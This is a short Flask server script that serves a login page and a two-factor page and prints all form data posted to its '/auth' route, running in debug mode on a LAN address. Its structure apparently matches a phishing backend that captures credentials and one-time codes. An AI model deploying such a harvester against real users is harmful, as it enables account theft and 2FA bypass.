
import time
from flask import Flask
from flask import render_template, send_file, make_response, request

app = Flask(__name__)


@app.route("/auth", methods=['GET', 'POST'])
def auth():
	print(request.form.to_dict())
	return "ok"


@app.route("/")
def index():
	response = make_response(send_file("Templates/login.html"))
	
	#response.headers.add("Access-Control-Allow-Origin", "*")
	return response


@app.route("/login")
def login():
	return send_file("Templates/2fa.html")


if __name__ == "__main__":
	app.run(debug=True, port=80, host='192.168.174.77')
